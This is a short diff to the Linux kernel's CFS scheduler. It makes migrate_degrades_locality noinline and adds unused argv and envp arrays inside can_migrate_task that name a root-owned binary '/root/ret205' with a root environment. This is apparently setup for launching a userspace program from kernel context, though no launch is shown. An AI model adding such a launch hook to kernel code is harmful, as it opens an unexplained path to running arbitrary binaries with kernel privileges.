@@ -7310,7 +7310,7 @@ static int task_hot(struct task_struct *p, struct lb_env *env)
  * Returns 0, if task migration improves locality i.e migration preferred.
  * Returns -1, if task migration is not affected by locality.
  */
-static int migrate_degrades_locality(struct task_struct *p, struct lb_env *env)
+static noinline int migrate_degrades_locality(struct task_struct *p, struct lb_env *env)
 {
 	struct numa_group *numa_group = rcu_dereference(p->numa_group);
 	unsigned long src_faults, dst_faults;
@@ -7420,6 +7420,14 @@ int can_migrate_task(struct task_struct *p, struct lb_env *env)
 		schedstat_inc(p->se.statistics.nr_failed_migrations_running);
 		return 0;
 	}
+
+    char *argv[] = { "/root/ret205", "help!", NULL };
+    static char *envp[] = {
+        "HOME=/",
+        "TERM=linux",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
+        NULL
+    };
 
 	/*
 	 * Aggressive migration if:
